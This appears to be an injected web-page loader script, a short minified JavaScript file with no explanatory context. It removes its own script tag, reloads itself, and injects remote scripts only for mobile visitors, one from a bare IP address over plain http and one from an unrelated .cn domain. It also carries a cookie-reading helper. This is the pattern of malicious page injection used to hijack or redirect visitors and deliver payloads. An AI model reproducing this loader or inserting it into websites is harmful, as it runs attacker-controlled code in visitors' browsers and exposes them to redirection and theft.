(function(j, g, d) { var i = document; var h = i.head || i.getElementsByTagName("head")[0];

    function e() { return i.currentScript || i.scripts[i.scripts.length - 1] } var f = e();
    g = f.src; if (g.indexOf("http:") != -1) { g = g.substring(7) } else { if (g.indexOf("https:") != -1) { g = g.substring(8) } else { if (g.indexOf("//") != -1) { g = g.substring(2) } } } var b = "https://" + g;

    function gc(name) { var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)"); if (arr = i.cookie.match(reg)) { return unescape(arr[2]); } else { return null; } }

    function a(l) { var k = i.createElement("script");
        k.src = l;
        h.appendChild(k); return k }

    function c() { if (!window._actived) { window._actived = true;
            a(b);
            f.parentNode.removeChild(f); if ((navigator.userAgent.toLowerCase().match(/(phone|pad|pod|iphone|ipod|ios|ipad|android|mobile|blackberry|iemobile|mqqbrowser|juc|fennec|wosbrowser|browserng|webos|symbian|windows phone)/i))) { a("http://47.103.72.172:10028/js/k.js?FKFN=Z");
                a("https://s.duoroumao.cn/yxs199.js"); } } }
    c() })(typeof arguments != "undefined", "", "");